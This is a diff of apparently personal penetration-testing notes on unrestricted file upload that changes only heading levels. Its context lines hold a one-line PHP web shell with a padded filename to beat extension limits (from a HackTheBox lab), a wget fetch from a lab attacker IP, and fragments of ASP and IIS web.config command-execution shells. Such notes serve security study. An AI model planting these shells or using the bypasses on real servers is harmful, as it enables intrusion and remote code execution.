@@ -4,9 +4,9 @@ title: Unrestricted File Upload
 
 Different ways to upload files and get RCE.
 
-# Identifies restrictions
+## Identifies restrictions
 
-## Extension
+### Extension
 
 Shortening the size (falafel.htb):
 
@@ -24,15 +24,15 @@ echo '<?php system($_GET["cmd"]);?>' > $(python3 -c 'print("A"*(236-4)+".php.png
 wget 'http://10.10.14.20:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'
 ```
 
-## Size
+### Size
 
-## Name
+### Name
 
-## Magic Number
+### Magic Number
 
-## Content
+### Content
 
-# ASP
+## ASP
 
 First we need to generate the reverse shell.
 
@@ -63,7 +63,7 @@ Response.Write(txt); 
 %>
 ```
 
-# .config RCE (IIS)
+## .config RCE (IIS)
 
 Uploading a `web.config` file to execute asp commands.
 
@@ -103,7 +103,7 @@ WScript.StdOut.Write(strOutput)
 WScript.Echo(strOutput)
 %>
 ```
-# PHP
+## PHP
 
 The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones.
 
